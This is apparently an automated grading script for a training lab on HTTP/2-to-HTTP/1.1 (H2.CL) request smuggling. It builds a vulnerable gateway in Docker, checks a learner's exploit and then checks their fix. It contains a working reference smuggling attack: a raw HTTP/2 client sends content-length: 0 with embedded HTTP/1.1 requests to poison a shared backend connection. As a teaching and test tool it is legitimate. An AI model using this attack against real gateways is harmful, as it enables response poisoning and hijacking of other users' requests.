#!/usr/bin/env python3
"""Verifier otomatis 2 fase untuk Lab 9.

Rantai: H2.CL downgrade desync (ala James Kettle, PortSwigger 2021;
kasus Netflix $20.000 / CVE-2021-21295).

Gateway menerima HTTP/2 (h2c, prior knowledge), menerjemahkannya jadi
HTTP/1.1, dan meneruskannya ke backend lewat satu koneksi keep-alive
bersama. Bug: header content-length/transfer-encoding dari H2
diteruskan apa adanya ke H1.

Hanya memakai Python stdlib (tanpa dependency), butuh `docker compose`
di host.

Alur:
  FASE 1 (pristine): bangun lab dari definisi rentan, pastikan
      - baseline GET / via H2              -> 200 "lab9: ok"
      - POST / via H2 (body DATA, tanpa content-length) -> 200
      - serangan referensi (health)        -> H2.CL: content-length: 0
        + DATA berisi 2x request H1 selundupan; probe normal menerima
        respons racun (200 + MARKER di body)
      - exploit/exploit.py milik learner dijalankan -> mencetak
        STATUS: 200 + SMUGGLED_PATH: /path; pemeriksaan independen:
        probe H2 baru harus menerima respons racun berisi SMUGGLED_PATH
        (learner wajib menyisakan satu respons racun di antrean)
  FASE 2 (dengan fix/): bangun ulang gateway dari fix/gateway, pastikan
      - serangan referensi GAGAL           -> 400 di stream serangan,
        tidak diteruskan, antrean bersih (probe -> 200 "lab9: ok")
      - fungsi normal utuh                 -> GET /, POST / (DATA saja),
        GET /lain -> 200

Deteksi scaffold (tanpa string TODO di file learner):
  - exploit: skrip scaffold me-raise NotImplementedError -> exit 3.
  - fix: isi fix/gateway/gateway.py identik byte-per-byte dengan
    gateway/gateway.py (pristine) -> exit 2.

Exit code: 0 = kedua fase lulus, 1 = gagal, 2 = fase 2 belum dikerjakan,
           3 = fase 1 belum dikerjakan (exploit.py belum ada/belum diisi).
"""
import filecmp
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import time

LAB_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080
MARKER = b"/h2cl-ref-9"
PASS, FAIL = "LULUS", "GAGAL"
results = []

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
F_DATA, F_HEADERS = 0x0, 0x1
F_SETTINGS, F_WINDOW_UPDATE = 0x4, 0x8
FL_ACK, FL_END_STREAM, FL_END_HEADERS = 0x1, 0x1, 0x4


def log(msg):
    print(msg, flush=True)


def check(name, ok, detail=""):
    results.append((name, ok))
    log("  [%s] %s%s" % (PASS if ok else FAIL, name, " -- " + detail if detail else ""))
    return ok


def run_compose(args):
    cmd = ["docker", "compose"] + args
    p = subprocess.run(cmd, cwd=LAB_DIR, capture_output=True, text=True, timeout=600)
    if p.returncode != 0:
        log("perintah gagal: %s\n%s" % (" ".join(cmd), p.stderr[-2000:]))
        sys.exit(1)
    return p


class H2:
    """Klien HTTP/2 minimal (prior knowledge) untuk keperluan verifikasi."""

    def __init__(self, host=HOST, port=PORT):
        self.s = socket.create_connection((host, port), timeout=10)
        self.rf = self.s.makefile("rb")
        self.s.sendall(PREFACE)
        self._send(F_SETTINGS, 0, 0, b"")
        while True:
            ftype, flags, _sid, _pl = self._read_frame()
            if ftype == F_SETTINGS and not (flags & FL_ACK):
                self._send(F_SETTINGS, FL_ACK, 0, b"")
                break
        self._next = 1

    def close(self):
        try:
            self.s.close()
        except OSError:
            pass

    def _send(self, ftype, flags, sid, payload):
        header = (len(payload).to_bytes(3, "big") + bytes([ftype, flags])
                  + (sid & 0x7FFFFFFF).to_bytes(4, "big"))
        self.s.sendall(header + payload)

    def _read_exact(self, n):
        data = b""
        while len(data) < n:
            chunk = self.rf.read(n - len(data))
            if not chunk:
                raise ConnectionError("EOF")
            data += chunk
        return data

    def _read_frame(self):
        raw = self._read_exact(9)
        length = int.from_bytes(raw[0:3], "big")
        ftype, flags = raw[3], raw[4]
        sid = int.from_bytes(raw[5:9], "big") & 0x7FFFFFFF
        payload = self._read_exact(length) if length else b""
        return ftype, flags, sid, payload

    @staticmethod
    def _hpack(headers):
        out = b""
        for name, value in headers:
            out += (b"\x00" + bytes([len(name)]) + name
                    + bytes([len(value)]) + value)
        return out

    @staticmethod
    def _decode_status(block):
        pos, status = 0, 0
        while pos < len(block):
            b = block[pos]
            if b == 0x88:
                status = 200
                pos += 1
            elif b & 0x80:
                pos += 1
                while block[pos - 1] & 0x80:
                    pos += 1
            else:
                pos += 1
                nlen = block[pos]
                pos += 1
                name = block[pos:pos + nlen]
                pos += nlen
                vlen = block[pos]
                pos += 1
                value = block[pos:pos + vlen]
                pos += vlen
                if name == b":status":
                    status = int(value)
        return status

    def request(self, method, path, headers=(), body=b"", stream=None):
        sid = stream if stream else self._next
        if not stream:
            self._next += 2
        hdrs = [(b":method", method), (b":path", path),
                (b":scheme", b"http"),
                (b":authority", ("%s:%d" % (HOST, PORT)).encode())]
        hdrs += list(headers)
        flags = FL_END_HEADERS | (FL_END_STREAM if not body else 0)
        self._send(F_HEADERS, flags, sid, self._hpack(hdrs))
        if body:
            self._send(F_DATA, FL_END_STREAM, sid, body)
        return self._read_response(sid)

    def _read_response(self, sid):
        status, body = 0, b""
        while True:
            ftype, flags, rsid, payload = self._read_frame()
            if rsid == 0:
                continue
            if rsid != sid:
                continue
            if ftype == F_HEADERS:
                status = self._decode_status(payload)
                if flags & FL_END_STREAM:
                    return status, body
            elif ftype == F_DATA:
                body += payload
                if flags & FL_END_STREAM:
                    return status, body


def h2_get(path):
    c = H2()
    try:
        return c.request(b"GET", path)
    except (OSError, ConnectionError):
        return 0, b""
    finally:
        c.close()


def h2_post_data(path, body):
    c = H2()
    try:
        return c.request(b"POST", path, [], body)
    except (OSError, ConnectionError):
        return 0, b""
    finally:
        c.close()


def reference_smuggle(path):
    """Serangan H2.CL referensi: content-length: 0 + DATA berisi 2x
    request H1 selundupan, lalu probe normal. Kembalikan (status, body)
    respons probe."""
    c = H2()
    try:
        smuggled = (("GET %s HTTP/1.1\r\nHost: x\r\n\r\n"
                     % path.decode("latin-1")).encode("latin-1")) * 2
        c.request(b"POST", b"/", [(b"content-length", b"0")],
                  smuggled, stream=1)
        return c.request(b"GET", b"/", [], b"", stream=3)
    except (OSError, ConnectionError):
        return 0, b""
    finally:
        c.close()


def wait_up(timeout=150):
    log("menunggu lab siap di %s:%d ..." % (HOST, PORT))
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            st, body = h2_get(b"/")
            if st == 200 and body == b"lab9: ok":
                return True
        except (OSError, ConnectionError):
            pass
        time.sleep(2)
    return False


def compose_down():
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "down", "--remove-orphans"])


def parse_exploit_output(out):
    m_status = re.search(r"^STATUS:\s*(\d{3})\s*$", out, re.MULTILINE)
    m_path = re.search(r"^SMUGGLED_PATH:\s*(\S+)\s*$", out, re.MULTILINE)
    return (m_status.group(1) if m_status else None,
            m_path.group(1) if m_path else None)


def main():
    if shutil.which("docker") is None:
        log("docker tidak ditemukan di PATH. Install Docker dulu lalu jalankan lagi.")
        sys.exit(1)

    log("== bersih-bersih container lama ==")
    compose_down()

    # ---------------- FASE 1 ----------------
    log("== FASE 1: membangun lab PRISTINE (rentan) ==")
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    st, body = h2_get(b"/")
    check("baseline GET / via H2 -> 200", st == 200 and body == b"lab9: ok",
          "dapat %s %r" % (st, body[:20]))
    st, body = h2_post_data(b"/", b"a=b")
    check("fungsi normal: POST / via H2 (DATA saja) -> 200", st == 200,
          "dapat %s" % st)

    st, body = reference_smuggle(MARKER)
    ok = (st == 200 and MARKER in body)
    check("serangan referensi: H2.CL diterima, probe kena racun "
          "(200 + marker)", ok, "dapat %s" % st)
    if not ok:
        log("LAB RUSAK: serangan referensi gagal di definisi pristine.")
        compose_down()
        sys.exit(1)

    log("== FASE 1: reset ke pristine segar untuk exploit learner ==")
    compose_down()
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    log("== FASE 1: menjalankan exploit/exploit.py milik learner ==")
    exp = os.path.join(LAB_DIR, "exploit", "exploit.py")
    try:
        p = subprocess.run([sys.executable, exp], capture_output=True,
                           text=True, timeout=60, cwd=os.path.dirname(exp))
    except subprocess.TimeoutExpired:
        log("exploit.py melebihi 60 detik.")
        compose_down()
        sys.exit(1)
    if "NotImplementedError" in (p.stderr or ""):
        log("exploit.py masih scaffold (NotImplementedError). Kerjakan fase 1 dulu.")
        compose_down()
        sys.exit(3)
    status, spath = parse_exploit_output(p.stdout or "")
    check("exploit mencetak STATUS: 200", status == "200",
          "dapat %r" % status)
    check("exploit mencetak SMUGGLED_PATH: /...", spath and spath.startswith("/"),
          "dapat %r" % spath)

    st, body = h2_get(b"/")
    poisoned = (status == "200" and spath and st == int(status)
                and spath.encode("latin-1") in body)
    check("pemeriksaan independen: probe H2 terima sisa racun "
          "(%s berisi %s)" % (st, spath), poisoned, "dapat %s" % st)

    compose_down()

    # ---------------- FASE 2 ----------------
    log("== FASE 2: cek scaffold fix ==")
    pristine = os.path.join(LAB_DIR, "gateway", "gateway.py")
    fixed = os.path.join(LAB_DIR, "fix", "gateway", "gateway.py")
    if filecmp.cmp(pristine, fixed, shallow=False):
        log("fix/gateway/gateway.py masih identik dengan pristine. Kerjakan fase 2 dulu.")
        sys.exit(2)

    log("== FASE 2: membangun lab dengan FIX ==")
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    c = H2()
    try:
        smuggled = (b"GET /h2cl-fix HTTP/1.1\r\nHost: x\r\n\r\n" * 2)
        st1, _b1 = c.request(b"POST", b"/", [(b"content-length", b"0")],
                             smuggled, stream=1)
    except (OSError, ConnectionError):
        st1 = 0
    finally:
        c.close()
    check("serangan referensi GAGAL: request ambigu -> 400", st1 == 400,
          "dapat %s" % st1)
    st, body = h2_get(b"/")
    check("antrean bersih: probe -> 200 tanpa racun",
          st == 200 and body == b"lab9: ok", "dapat %s %r" % (st, body[:20]))
    st, _ = h2_post_data(b"/", b"a=b")
    check("fungsi normal: POST / via H2 (DATA saja) -> 200", st == 200,
          "dapat %s" % st)
    st, body = h2_get(b"/lain")
    check("fungsi normal: GET /lain -> 200", st == 200, "dapat %s" % st)

    compose_down()

    failed = [n for (n, ok) in results if not ok]
    log("== HASIL: %d/%d cek lulus ==" % (len(results) - len(failed), len(results)))
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
